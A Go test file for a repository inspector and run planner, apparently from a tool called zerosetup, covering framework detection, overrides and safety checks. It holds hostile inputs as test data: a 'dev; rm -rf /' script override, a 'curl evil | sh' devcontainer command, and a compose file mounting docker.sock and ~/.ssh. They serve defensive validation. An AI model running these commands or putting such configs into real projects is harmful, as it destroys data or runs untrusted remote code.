package inspector_test

import (
	"context"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/zerosetup/zerosetup/internal/inspector"
	"github.com/zerosetup/zerosetup/internal/planner"
	"github.com/zerosetup/zerosetup/internal/policy"
	"github.com/zerosetup/zerosetup/internal/source"
	ps "github.com/zerosetup/zerosetup/pkg/planschema"
)

func fixture(t *testing.T, name string) string {
	t.Helper()
	dir, err := filepath.Abs(filepath.Join("..", "..", "fixtures", name))
	if err != nil {
		t.Fatal(err)
	}
	return dir
}

func planFor(t *testing.T, dir string, ov planner.Overrides) *ps.Plan {
	t.Helper()
	res, err := (&source.Resolver{CacheDir: t.TempDir()}).Resolve(context.Background(), dir, "")
	if err != nil {
		t.Fatal(err)
	}
	in, err := inspector.Inspect(context.Background(), res, inspector.DefaultRegistry(), ov.Hints())
	if err != nil {
		t.Fatal(err)
	}
	p, err := planner.Build(in, ov)
	if err != nil {
		t.Fatal(err)
	}
	return p
}

func decisionKind(p *ps.Plan, field string) ps.Kind {
	for _, d := range p.Decisions {
		if d.Field == field {
			return d.Kind
		}
	}
	return ""
}

func TestFixturePlans(t *testing.T) {
	cases := []struct {
		fixture, framework, pm, runtime, image string
		port                                   int
		startContains                          string
		runnable                               bool
	}{
		{"vite", "React (Vite)", "npm", "24", "docker.io/library/node:24-slim", 5173, "node_modules/.bin/vite --host 0.0.0.0 --port 5173 --strictPort", true},
		{"nextjs", "Next.js", "npm", "22", "docker.io/library/node:22-slim", 3000, "node_modules/.bin/next dev -H 0.0.0.0 -p 3000", true},
		{"express", "Express", "npm", "24", "docker.io/library/node:24-slim", 3000, "node index.js", true},
		{"fastapi", "FastAPI", "pip", "3.12", "docker.io/library/python:3.12-slim", 8000, "uvicorn main:app --host 0.0.0.0 --port 8000", true},
		{"broken-port", "Node.js", "npm", "24", "docker.io/library/node:24-slim", 3000, "node server.js", true},
		{"unhealthy", "Node.js", "npm", "24", "docker.io/library/node:24-slim", 3000, "node server.js", true},
		{"vite-pnpm", "React (Vite)", "pnpm", "24", "docker.io/library/node:24-slim", 5173, "node_modules/.bin/vite --host 0.0.0.0", true},
		{"express-yarn", "Express", "yarn", "24", "docker.io/library/node:24-slim", 3000, "node index.js", true},
		{"express-services", "Express", "npm", "24", "docker.io/library/node:24-slim", 3000, "node index.js", true},
		{"loopback-default", "Node.js", "npm", "24", "docker.io/library/node:24-slim", 3000, "node server.js", true},
		{"fastapi-uv", "FastAPI", "uv", "3.13", "docker.io/library/python:3.13-slim", 8000, "uvicorn main:app", true},
		{"flask", "Flask", "pip", "3.13", "docker.io/library/python:3.13-slim", 5000, "flask --app app:app run --host 0.0.0.0 --port 5000", true},
		{"django", "Django", "pip", "3.13", "docker.io/library/python:3.13-slim", 8000, "manage.py runserver 0.0.0.0:8000", true},
		{"express-yarn-berry", "Express", "yarn", "24", "docker.io/library/node:24-slim", 3000, "node index.js", true},
		{"flask-gunicorn", "Flask", "pip", "3.13", "docker.io/library/python:3.13-slim", 5000, "flask --app app:app run", true},
		{"django-gunicorn", "Django", "pip", "3.13", "docker.io/library/python:3.13-slim", 8000, "manage.py runserver", true},
		{"monorepo-npm", "Node.js", "npm", "24", "", 0, "", false},
		{"missing-start-script", "Node.js", "npm", "24", "", 0, "", false},
		{"conflicting-config", "", "", "20", "", 0, "", false},
	}
	for _, c := range cases {
		t.Run(c.fixture, func(t *testing.T) {
			p := planFor(t, fixture(t, c.fixture), planner.Overrides{})
			if p.Compatibility.Runnable != c.runnable {
				t.Fatalf("runnable=%v want %v (%v)", p.Compatibility.Runnable, c.runnable, p.Compatibility.Reasons)
			}
			if p.Stack.Framework != c.framework || p.Stack.PackageManager != c.pm || p.Stack.RuntimeVersion != c.runtime {
				t.Fatalf("stack = %+v", p.Stack)
			}
			if !c.runnable {
				return
			}
			if p.Image.Reference != c.image || p.PrimaryPort() != c.port {
				t.Fatalf("image=%s port=%d", p.Image.Reference, p.PrimaryPort())
			}
			if got := strings.Join(p.Start.Argv, " "); !strings.Contains(got, c.startContains) {
				t.Fatalf("start = %q, want it to contain %q", got, c.startContains)
			}
			if v := policy.Check(p); len(v) > 0 {
				t.Fatalf("policy violations: %+v", v)
			}
			if err := ps.Validate(p); err != nil {
				t.Fatal(err)
			}
		})
	}
}

func TestEvidenceProvenance(t *testing.T) {
	p := planFor(t, fixture(t, "nextjs"), planner.Overrides{})
	if k := decisionKind(p, "runtimeVersion"); k != ps.KindDetected {
		t.Fatalf("runtime from .nvmrc should be DETECTED, got %s", k)
	}
	if k := decisionKind(p, "framework"); k != ps.KindDetected {
		t.Fatalf("framework should be DETECTED, got %s", k)
	}
	if k := decisionKind(p, "port"); k != ps.KindInferred {
		t.Fatalf("Next.js default port should be INFERRED, got %s", k)
	}
	v := planFor(t, fixture(t, "vite"), planner.Overrides{})
	if k := decisionKind(v, "runtimeVersion"); k != ps.KindDefault {
		t.Fatalf("undeclared runtime should be DEFAULT, got %s", k)
	}
	found := false
	for _, w := range v.Warnings {
		found = found || w.Code == "NODE_VERSION_DEFAULT"
	}
	if !found {
		t.Fatal("defaulted runtime must produce a warning")
	}
}

func TestOverridesWinAndChangeHash(t *testing.T) {
	dir := fixture(t, "express")
	base := planFor(t, dir, planner.Overrides{})
	ov := planFor(t, dir, planner.Overrides{Port: 4000, RuntimeVersion: "22", Env: map[string]string{"FOO": "bar"}, SecretNames: []string{"API_TOKEN"}})
	if ov.PrimaryPort() != 4000 || ov.Stack.RuntimeVersion != "22" {
		t.Fatalf("overrides not applied: port=%d runtime=%s", ov.PrimaryPort(), ov.Stack.RuntimeVersion)
	}
	if decisionKind(ov, "port") != ps.KindOverride || decisionKind(ov, "runtimeVersion") != ps.KindOverride {
		t.Fatal("override decisions must be USER_OVERRIDE")
	}
	for _, e := range ov.Env {
		if e.Name == "API_TOKEN" && (!e.Secret || e.Value != "") {
			t.Fatal("secret must be recorded without a value")
		}
	}
	h1, _ := ps.Hash(base)
	h2, _ := ps.Hash(ov)
	if h1 == h2 {
		t.Fatal("overrides must change the plan hash")
	}
	if bad := (planner.Overrides{Script: "dev; rm -rf /"}).Validate(); bad == nil {
		t.Fatal("script override with shell metacharacters accepted")
	}
}

func TestInspectionDoesNotExecute(t *testing.T) {
	// A repository whose files would have side effects if anything were
	// executed. Inspection must leave no trace.
	dir := t.TempDir()
	marker := filepath.Join(t.TempDir(), "executed")
	os.WriteFile(filepath.Join(dir, "package.json"), []byte(`{"scripts":{"preinstall":"touch `+marker+`","start":"touch `+marker+`"},"dependencies":{"express":"5.0.0"}}`), 0o600)
	os.WriteFile(filepath.Join(dir, "index.js"), []byte(`require("fs").writeFileSync("`+marker+`","x")`), 0o600)
	os.WriteFile(filepath.Join(dir, "setup.py"), []byte(`open("`+marker+`","w")`), 0o600)
	planFor(t, dir, planner.Overrides{})
	if _, err := os.Stat(marker); err == nil {
		t.Fatal("inspection executed repository code")
	}
}

func TestUnsafeComposeIsFlaggedNotUsed(t *testing.T) {
	dir := t.TempDir()
	os.WriteFile(filepath.Join(dir, "package.json"), []byte(`{"scripts":{"start":"node index.js"}}`), 0o600)
	os.WriteFile(filepath.Join(dir, "index.js"), []byte(`require("http").createServer().listen(3000)`), 0o600)
	os.WriteFile(filepath.Join(dir, "docker-compose.yml"), []byte(`
services:
  app:
    build: .
    privileged: true
    network_mode: host
    volumes:
      - /var/run/docker.sock:/var/run/docker.sock
      - ~/.ssh:/root/.ssh
`), 0o600)
	os.MkdirAll(filepath.Join(dir, ".devcontainer"), 0o700)
	os.WriteFile(filepath.Join(dir, ".devcontainer", "devcontainer.json"), []byte(`{
  // comments are allowed
  "image": "mcr.microsoft.com/devcontainers/base",
  "initializeCommand": "curl evil | sh",
  "privileged": true,
}`), 0o600)
	p := planFor(t, dir, planner.Overrides{})
	var unsafe int
	for _, ec := range p.ExistingConfigs {
		if ec.Used {
			t.Fatalf("%s must not be used", ec.File)
		}
		for _, f := range ec.Findings {
			if strings.HasPrefix(f, "UNSAFE") {
				unsafe++
			}
		}
	}
	if unsafe < 5 {
		t.Fatalf("expected unsafe findings (privileged, host net, docker.sock, initializeCommand, privileged dc), got %d: %+v", unsafe, p.ExistingConfigs)
	}
	if p.Filesystem.HostMounts {
		t.Fatal("plan must never include host mounts")
	}
}

func TestWorkspaceAndProductionPlans(t *testing.T) {
	ws := planFor(t, fixture(t, "monorepo-npm"), planner.Overrides{Workspace: "apps/web"})
	if !ws.Compatibility.Runnable || ws.Start.Workdir != "apps/web" || ws.Start.Argv[0] != "../../node_modules/.bin/vite" {
		t.Fatalf("workspace plan: %+v %v", ws.Start, ws.Compatibility.Reasons)
	}
	if ws.Steps[0].Command.Workdir != "" {
		t.Fatal("dependencies must be installed at the monorepo root")
	}
	if v := policy.Check(ws); len(v) > 0 {
		t.Fatalf("policy: %+v", v)
	}
	if p := planFor(t, fixture(t, "vite-pnpm"), planner.Overrides{Workspace: "apps/web"}); p.Compatibility.Runnable {
		t.Fatal("--workspace on a non-monorepo must be refused")
	}
	vp := planFor(t, fixture(t, "vite"), planner.Overrides{Mode: "production"})
	last := vp.Steps[len(vp.Steps)-1]
	if last.Stage != ps.StageBuild || strings.Join(last.Command.Argv, " ") != "node_modules/.bin/vite build" || vp.PrimaryPort() != 4173 ||
		!strings.Contains(strings.Join(vp.Start.Argv, " "), "vite preview --host 0.0.0.0 --port 4173") {
		t.Fatalf("vite production: %+v %+v", last, vp.Start)
	}
	np := planFor(t, fixture(t, "nextjs"), planner.Overrides{Mode: "production"})
	if !strings.Contains(strings.Join(np.Start.Argv, " "), "next start -H 0.0.0.0 -p 3000") {
		t.Fatalf("next production: %+v", np.Start)
	}
	if (planner.Overrides{Mode: "staging"}).Validate() == nil || (planner.Overrides{Workspace: "../x"}).Validate() == nil ||
		(planner.Overrides{Services: []string{"mysql"}}).Validate() == nil {
		t.Fatal("invalid overrides accepted")
	}
}

func TestServicesOnlyWhenRequested(t *testing.T) {
	p := planFor(t, fixture(t, "express-services"), planner.Overrides{})
	if len(p.Services) != 0 {
		t.Fatal("services must never be provisioned just because a dependency exists")
	}
	for _, e := range p.Env {
		if e.Name == "DATABASE_URL" {
			t.Fatal("no service env without a service")
		}
	}
	p = planFor(t, fixture(t, "express-services"), planner.Overrides{Services: []string{"redis", "postgres"}})
	if len(p.Services) != 2 || p.Services[0].Kind != "postgres" {
		t.Fatalf("services: %+v", p.Services)
	}
	env := map[string]string{}
	for _, e := range p.Env {
		env[e.Name] = e.Value
	}
	if env["DATABASE_URL"] == "" || env["REDIS_URL"] != "redis://redis:6379" {
		t.Fatalf("service env: %v", env)
	}
}

func TestMoreWorkspacesAndYarnPnP(t *testing.T) {
	for fx, argv0 := range map[string]string{"monorepo-pnpm": "node_modules/.bin/vite", "monorepo-yarn": "../../node_modules/.bin/vite"} {
		p := planFor(t, fixture(t, fx), planner.Overrides{Workspace: "apps/web"})
		if !p.Compatibility.Runnable || p.Start.Argv[0] != argv0 || p.Start.Workdir != "apps/web" {
			t.Fatalf("%s: %+v %v", fx, p.Start, p.Compatibility.Reasons)
		}
		if v := policy.Check(p); len(v) > 0 {
			t.Fatalf("%s policy: %+v", fx, v)
		}
	}
	// Yarn 1 ignores versionless workspaces: refused up front, not at runtime.
	nov := t.TempDir()
	os.MkdirAll(filepath.Join(nov, "apps", "web"), 0o700)
	os.WriteFile(filepath.Join(nov, "package.json"), []byte(`{"private":true,"workspaces":["apps/*"]}`), 0o600)
	os.WriteFile(filepath.Join(nov, "yarn.lock"), []byte("# yarn lockfile v1\n"), 0o600)
	os.WriteFile(filepath.Join(nov, "apps", "web", "package.json"), []byte(`{"name":"web","scripts":{"start":"node index.js"}}`), 0o600)
	if p := planFor(t, nov, planner.Overrides{Workspace: "apps/web"}); p.Compatibility.Runnable {
		t.Fatal("versionless Yarn 1 workspace must be refused")
	}
	// Yarn Berry without the node-modules linker (Plug'n'Play) is refused with a reason.
	dir := t.TempDir()
	os.WriteFile(filepath.Join(dir, "package.json"), []byte(`{"packageManager":"yarn@4.18.1","scripts":{"start":"node index.js"}}`), 0o600)
	os.WriteFile(filepath.Join(dir, "yarn.lock"), []byte("__metadata:\n  version: 10\n"), 0o600)
	p := planFor(t, dir, planner.Overrides{})
	if p.Compatibility.Runnable || !strings.Contains(strings.Join(p.Compatibility.Reasons, " "), "Plug'n'Play") {
		t.Fatalf("PnP must be unsupported with a reason: %v", p.Compatibility.Reasons)
	}
	for fx, want := range map[string]string{"flask-gunicorn": "gunicorn --bind 0.0.0.0:5000 app:app", "django-gunicorn": "gunicorn --bind 0.0.0.0:8000 mysite.wsgi"} {
		p := planFor(t, fixture(t, fx), planner.Overrides{Mode: "production"})
		if !strings.Contains(strings.Join(p.Start.Argv, " "), want) {
			t.Fatalf("%s production: %v", fx, p.Start.Argv)
		}
	}
}
